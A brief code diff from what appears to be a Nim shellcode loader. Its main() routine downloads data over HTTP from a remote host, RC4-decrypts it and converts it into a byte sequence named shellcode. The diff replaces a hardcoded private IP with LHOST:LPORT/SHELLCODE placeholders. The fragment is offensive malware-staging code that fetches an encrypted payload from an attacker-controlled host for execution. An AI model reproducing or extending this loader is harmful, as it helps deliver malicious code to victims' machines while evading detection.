@@ -15,7 +15,7 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
 
 proc main(): void = 
-    data = client.getContent("http://192.168.198.128:8000/api")
+    data = client.getContent("http://LHOST:LPORT/SHELLCODE")
     client.close()
     dec = fromRC4(key, data)
     shellcode = toByteSeq(dec)
